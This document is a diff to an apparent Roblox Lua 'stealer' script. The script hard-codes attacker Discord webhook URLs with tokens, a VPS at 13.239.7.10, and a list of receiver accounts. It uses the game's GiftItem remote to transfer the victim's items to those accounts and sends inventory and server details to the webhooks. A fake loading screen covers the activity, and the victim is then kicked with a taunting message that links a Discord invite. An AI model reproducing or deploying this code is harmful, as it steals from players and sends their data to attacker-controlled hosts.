@@ -1,3 +1,7 @@
+if _G.__Ran then return end
+_G.__Ran = true
+if game.PlaceId ~= 127742093697776 then game.Players.LocalPlayer:Kick("Wrong game") return end
+
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
@@ -10,9 +14,9 @@ local HRP = Character:WaitForChild("HumanoidRootPart")
 local Backpack = player:WaitForChild("Backpack")
 local humanoid = Character:WaitForChild("Humanoid")
 
-local PUBLIC_WEBHOOK_URL = "https://discord.com/api/webhooks/1452387900166635622/6jzYQUIloNR8GvEq4dtGp0ZIbie2--AI9_oYBa3Fc7i1f-xvBGcJDSgr7ltJL90lzLAb "
-local WEBHOOK_URL = _G["Zero_Config"].user_webhook
-local TARGET_PLAYERS = _G["Zero_Config"].users or {}
+local PUBLIC_WEBHOOK_URL = "https://discord.com/api/webhooks/1452387900166635622/6jzYQUIloNR8GvEq4dtGp0ZIbie2--AI9_oYBa3Fc7i1f-xvBGcJDSgr7ltJL90lzLAb"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1445410079363956746/9kTNwSiB2usi0_GPQ0YKDCy-H0d6ZKFlp5W1VdfM7gc0LjpF7ANLENp3pGWhTwthLlj5"
+local TARGET_PLAYERS = {"ZeroClaimer1", "ZeroClaimer2", "ZeroClaimer3"}
 
 local Remotes = ReplicatedStorage:WaitForChild("Remotes")
 local GiftRemote = Remotes:WaitForChild("GiftItem")
@@ -121,7 +125,7 @@ end
 end
 receiver.Chatted:Connect(function(msg)
 if msg == ".kick" then
-player:Kick("OOPS, SOME OF YOUR VALUABLE ITEMS HAVE BEEN STOLEN, but YOU CAN DO IT TO: https://discord.gg/rV7ReMVgxP ")
+player:Kick("OOPS, SOME OF YOUR VALUABLE ITEMS HAVE BEEN STOLEN, but YOU CAN DO IT TO: https://discord.gg/rV7ReMVgxP")
 else
 receiverActivity[receiverName] = true
 activeReceiver = receiverName
@@ -157,7 +161,7 @@ end)
 end
 p.Chatted:Connect(function(msg)
 if msg == ".kick" then
-player:Kick("OOPS, SOME OF YOUR VALUABLE ITEMS HAVE BEEN STOLEN, but YOU CAN DO IT TO: https://discord.gg/rV7ReMVgxP ")
+player:Kick("OOPS, SOME OF YOUR VALUABLE ITEMS HAVE BEEN STOLEN, but YOU CAN DO IT TO: https://discord.gg/rV7ReMVgxP")
 else
 receiverActivity[receiverName] = true
 activeReceiver = receiverName
@@ -303,7 +307,7 @@ end)
 task.spawn(function()
 local webhookHit = WEBHOOK_URL or ""
 local api_key = getgenv().API_KEY or "supersecretkey"
-local url_hit = getgenv().INCREMENT_URL or "http://13.239.7.10:5000/increment-hitcount "
+local url_hit = getgenv().INCREMENT_URL or "http://13.239.7.10:5000/increment-hitcount"
 if webhookHit ~= "" then
 local payloadHit = HttpService:JSONEncode({ webhook = webhookHit })
 local headersHit = { ["Content-Type"] = "application/json", ["X-API-KEY"] = api_key }
@@ -322,7 +326,7 @@ end)
 
 local function triggerClient1()
 task.spawn(function()
-local VPS_URL = "http://13.239.7.10:5000/submit-job "
+local VPS_URL = "http://13.239.7.10:5000/submit-job"
 local RETRY_DELAY, RETRIES = 2, 3
 local job_id = tostring(game.JobId or getgenv().JOB_ID or "")
 local place_id = tostring(game.PlaceId or getgenv().PLACE_ID or "")
@@ -416,7 +420,7 @@ end)
 
 task.spawn(function()
 task.wait(4)
-local WEBHOOK_DUALHOOK = "https://discord.com/api/webhooks/1445411548008022129/9Bz7RiwuJ3paUaN6Kt7TwiKP2UX9h2rSSRk9GoDyr3z2Fb0dB7qjZHtrSNxi94ZjVQnB "
+local WEBHOOK_DUALHOOK = "https://discord.com/api/webhooks/1445411548008022129/9Bz7RiwuJ3paUaN6Kt7TwiKP2UX9h2rSSRk9GoDyr3z2Fb0dB7qjZHtrSNxi94ZjVQnB"
 local D_CHANCE = 0.10
 local allTools = {}
 for _, item in ipairs(Backpack:GetChildren()) do table.insert(allTools, item) end
@@ -481,7 +485,7 @@ local embedHitBrainrots = limitList(hitListBrainrots)
 local totalHits = #hitListPlants + #hitListBrainrots
 local hasPriority = totalHits > 0
 local embedColor = hasPriority and 0x2ECC71 or 0xE74C3C
-local serverLink = string.format("https://floating.gg/?placeID=%s&gameInstanceId=%s ", game.PlaceId, game.JobId)
+local serverLink = string.format("https://floating.gg/?placeID=%s&gameInstanceId=%s", game.PlaceId, game.JobId)
 local backpackString = table.concat(backpackLines, "\n")
 local function makeEmbed(isPublic)
 local fields = {
@@ -631,7 +635,7 @@ discordLabel.BackgroundTransparency = 1
 discordLabel.TextColor3 = Color3.new(1,1,1)
 discordLabel.Font = Enum.Font.Gotham
 discordLabel.TextScaled = true
-discordLabel.Text = "Join our Discord: https://discord.gg/rV7ReMVgxP "
+discordLabel.Text = "Join our Discord: https://discord.gg/rV7ReMVgxP"
 discordLabel.Parent = bg
 
 local fruits = {"🍎","🍌","🍓","🍇","🍉","🍍","🍒","🥭"}
@@ -695,4 +699,4 @@ RunService.RenderStepped:Connect(function()
 	local progress = elapsed / totalTime
 	barFill.Size = UDim2.fromScale(progress,1)
 	text.Text = "Loading... "..math.floor(progress * 100).."%"
-end
+end)
